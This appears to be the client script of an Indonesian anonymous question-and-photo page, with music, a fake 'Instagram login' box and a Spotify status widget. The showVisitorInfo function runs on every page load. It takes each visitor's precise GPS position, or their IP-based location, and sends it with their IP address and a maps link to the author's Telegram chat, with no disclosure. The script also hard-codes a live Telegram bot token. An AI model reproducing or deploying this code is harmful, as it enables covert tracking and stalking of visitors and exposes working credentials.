const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
if (openPhotoOptions && photoOptions) {
  openPhotoOptions.addEventListener('click', () => {
    photoOptions.classList.toggle('show');
  });
}

// NOTE: ganti token/chat id dengan milikmu kalau perlu
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

/* === MUSIK (mobile-friendly) === */
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
if (music) music.volume = 0.4;

async function startMusic() {
  if (started || !music) return;
  started = true;
  music.muted = false;
  try {
    await music.play();
    if (btnMusic) btnMusic.classList.remove("show");
    if (btnMusic) btnMusic.disabled = true;
  } catch (err) {
    if (btnMusic) btnMusic.classList.add("show");
    console.log("Autoplay gagal:", err);
  }
}

const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });

if (btnMusic) {
  btnMusic.addEventListener('click', async () => {
    try {
      await music.play();
      music.muted = false;
      started = true;
      btnMusic.classList.remove("show");
      btnMusic.disabled = true;
    } catch (e) {
      alert("Browser kamu memblokir musik otomatis. Ketuk ulang tombol 🎵");
      console.log(e);
    }
  });
}

if (isMobile) {
  if (btnMusic) btnMusic.classList.add("show");
  if (music) music.muted = true;
} else {
  // coba autoplay ringan di desktop
  setTimeout(() => { startMusic(); }, 800);
}

/* === MODAL PERTANYAAN === */
const modal = document.getElementById('modal');
const openAskBtn = document.getElementById('openAsk');
const closeQBtn = document.getElementById('closeQ');
if (openAskBtn && modal) openAskBtn.onclick = () => modal.classList.add('show');
if (closeQBtn && modal) closeQBtn.onclick = () => modal.classList.remove('show');

/* === LOGIN INSTAGRAM SIMPLE === */
const overlay = document.getElementById("blurOverlay");
const input = document.getElementById("igInput");
const btnLogin = document.getElementById("igSubmit");
const savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  if (!overlay) return;
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  if (!e) return;
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) { removeOverlay(); showUserStatus(savedIG); }
if (btnLogin) {
  btnLogin.onclick = () => {
    const u = input.value.trim();
    if (!u) return alert("Masukkan username dulu");
    localStorage.setItem("ig_user", u);
    showUserStatus(u);
    removeOverlay();
  };
}

/* === UTILS: kirim pesan ke Telegram (UI animasi) === */
async function sendTelegramMessage(url, body, el) {
  if (!el) return false;
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(()=>{});
      } catch(e){}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(()=>el.innerHTML="",3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

/* === KIRIM PERTANYAAN (modal) === */
const sendQBtn = document.getElementById('sendQ');
if (sendQBtn) {
  sendQBtn.addEventListener('click', async () => {
    const savedUser = localStorage.getItem("ig_user") || "Anonim";
    const text = document.getElementById('qtext').value.trim();
    const qmsg = document.getElementById('qmsg');
    if (!text) { if (qmsg) qmsg.textContent = "Isi pertanyaan dulu."; return; }
    await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
      qmsg
    );
    setTimeout(()=>{ if(qmsg && qmsg.textContent.includes("Terkirim")) modal.classList.remove('show'); }, 900);
  });
}

/* === KIRIM FOTO & PREVIEW === */
const takeBtn = document.getElementById("takePhoto");
const photoInput = document.getElementById("photoInput");
const preview = document.getElementById("photoPreview");
if (takeBtn) {
  takeBtn.onclick = async () => {
    try {
      const cameraInput = document.createElement("input");
      cameraInput.type = "file";
      cameraInput.accept = "image/*";
      cameraInput.capture = "user";
      cameraInput.click();
      cameraInput.onchange = () => {
        if (cameraInput.files.length > 0) {
          photoInput.files = cameraInput.files;
          const reader = new FileReader();
          reader.onload = (e) => { if (preview) { preview.src = e.target.result; preview.style.display = "block"; } };
          reader.readAsDataURL(cameraInput.files[0]);
        }
      };
    } catch (e) { alert("Kamera tidak tersedia"); }
  };
}
if (photoInput) {
  photoInput.addEventListener('change', () => {
    if (photoInput.files && photoInput.files[0]) {
      const reader = new FileReader();
      reader.onload = () => {};
      reader.readAsDataURL(photoInput.files[0]);
    }
  });
}
const sendPhotoBtn = document.getElementById("sendPhoto");
if (sendPhotoBtn) {
  sendPhotoBtn.addEventListener('click', async () => {
    const savedUser = localStorage.getItem("ig_user") || "Anonim";
    const fileInput = document.getElementById("photoInput");
    const file = fileInput.files && fileInput.files[0];
    const caption = document.getElementById("caption").value;
    const statusEl = document.getElementById("status");
    if (!file) { if (statusEl) statusEl.textContent = "Pilih foto dulu."; return; }
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
    fd.append("photo", file);
    const ok = await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: fd },
      statusEl
    );
    if (ok) {
      fileInput.value = "";
      const c = document.getElementById("caption");
      if (c) c.value = "";
      if (preview) preview.style.display = "none";
    }
  });
}

/* === SHOW VISITOR INFO (GPS -> IP fallback) === */
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  async function sendToTelegram(d, latitude, longitude, source = "Unknown") {
    try {
      const now = new Date();
      const mapLink = (latitude && longitude) ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17` : "https://www.google.com/maps";
      const msg = `📢 Pengunjung Baru!
👤 ${savedUser}
🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
🗺️ Maps: ${mapLink}
📡 IP: ${d.ip || "?"}
🕓 ${now.toLocaleString('id-ID')}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    } catch (err) { console.error("sendToTelegram error:", err); }
  }

  try {
    const coords = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
    });
    const { latitude, longitude } = coords.coords;
    const ipData = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(ipData, latitude, longitude, "GPS");
  } catch (err) {
    try {
      const d = await (await fetch("https://ipwho.is/")).json();
      await sendToTelegram(d, d.latitude, d.longitude, "IP");
    } catch (e) {
      console.warn("Visitor info failed:", e);
    }
  }
}
showVisitorInfo();

/* === BUTTERFLY EFFECT (simple) === */
(function(){
  const area = document.querySelector('.card');
  if (!area) return;
  area.style.position = area.style.position || 'relative';
  const butterflies = [];
  const count = 7;
  function getBounds(){ const rect = area.getBoundingClientRect(); return { w: rect.width, h: rect.height }; }
  const bounds = getBounds();
  for (let i = 0; i < count; i++) {
    const b = document.createElement('div');
    b.className = 'butterfly';
    b.textContent = '💸';
    b.style.position = 'absolute';
    b.style.left = (Math.random() * bounds.w) + 'px';
    b.style.top = (Math.random() * bounds.h) + 'px';
    const size = 16 + Math.random() * 12;
    b.style.fontSize = size + 'px';
    area.appendChild(b);
    butterflies.push({ el: b, vx: (Math.random()-0.5)*1.4, vy: (Math.random()-0.5)*1.4 });
  }
  function loop() {
    butterflies.forEach(obj => {
      const el = obj.el;
      const x = parseFloat(el.style.left);
      const y = parseFloat(el.style.top);
      let nx = x + obj.vx;
      let ny = y + obj.vy;
      const rect = getBounds();
      if (nx < 0 || nx > rect.w - 10) obj.vx *= -1;
      if (ny < 0 || ny > rect.h - 10) obj.vy *= -1;
      el.style.left = (x + obj.vx) + 'px';
      el.style.top = (y + obj.vy) + 'px';
    });
    requestAnimationFrame(loop);
  }
  requestAnimationFrame(loop);
})();

/* === LIVE MODE STATUS (creates #liveModeStatus) === */
(function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if (!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;

  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `
    width:100%;
    display:block;
    text-align:center;
    font-size:14px;
    font-family: "Poppins", monospace;
    color:#cfcfcf;
    opacity:0;
    transform:translateY(6px);
    transition:opacity .6s ease, transform .4s ease;
    margin-top:6px;
    margin-bottom:4px;
  `;

  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);

  async function updateStatus() {
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status", { cache: "no-store" });
      const data = await res.json();
      const text = data.status || "Status unknown";
      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;
        statusBox.style.transform = "translateY(6px)";
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;
          statusBox.style.transform = "translateY(0)";
          let color = "#fff";
          if (data.status && data.status.includes("Online")) color = "#00ffb3";
          else if (data.status && data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status && data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch (e) {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.opacity = 1;
      statusBox.style.color = "#ff7979";
      console.warn("updateStatus error:", e);
    }
  }

  updateStatus();
  setInterval(updateStatus, 4000);
})();

/* === SPOTIFY PREVIEW (teks dipaksa berada di bawah cover) === */
(async function(){
  const API_URL = "https://sybau.imamadevera.workers.dev/spotify";
  let liveStatus = document.getElementById("liveModeStatus");
  if (!liveStatus) return;

  // buat container spotify
  const spotifyBox = document.createElement("div");
  spotifyBox.id = "spotifyPreviewBox";
  spotifyBox.style.cssText = `
    width:100%;
    max-width:280px;
    margin:10px auto;
    text-align:center;
    display:flex;
    flex-direction:column;
    align-items:center;
    transition:opacity .35s ease, transform .25s ease;
    opacity:0;
  `;

  // cover wrapper
  const coverWrap = document.createElement("div");
  coverWrap.style.cssText = `
    position:relative;
    width:100%;
    height:100px;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 0 18px rgba(76,201,255,0.18);
  `;
  const cover = document.createElement("img");
  cover.id = "spotifyPreviewCover";
  cover.style.cssText = `width:100%;height:100%;object-fit:cover;display:none;transition:transform .25s ease;`;
  const progressBar = document.createElement("div");
  progressBar.style.cssText = `position:absolute;bottom:0;left:0;height:4px;width:0%;background:linear-gradient(90deg,#4cc9ff,#b5179e);transition:width .4s linear;`;
  coverWrap.appendChild(cover);
  coverWrap.appendChild(progressBar);

  // pastikan kita menempatkan spotifyBox tepat sebelum liveStatus, lalu masukkan liveStatus ke dalam spotifyBox
  if (liveStatus.parentNode) {
    liveStatus.parentNode.insertBefore(spotifyBox, liveStatus);
  } else {
    // fallback: append ke body
    document.body.appendChild(spotifyBox);
  }
  spotifyBox.appendChild(coverWrap);
  spotifyBox.appendChild(liveStatus); // PENTING: ini memindahkan elemen existing ke dalam spotifyBox (di bawah cover)

  async function updateSpotify(){
    try {
      const res = await fetch(API_URL, { cache: "no-store" });
      const data = await res.json();
      if (data && data.cover) {
        cover.src = data.cover;
        cover.style.display = "block";
      } else {
        cover.style.display = "none";
      }
      if (data && data.progress_ms && data.duration_ms) {
        progressBar.style.width = Math.min((data.progress_ms / data.duration_ms) * 100, 100) + "%";
      } else {
        progressBar.style.width = "0%";
      }
      spotifyBox.style.opacity = 1;
      spotifyBox.style.transform = "scale(1)";
    } catch (e) {
      console.warn("updateSpotify error:", e);
    }
  }

  // initial load + interval
  updateSpotify();
  setInterval(updateSpotify, 80000);
})();

/* === end of script.js === */
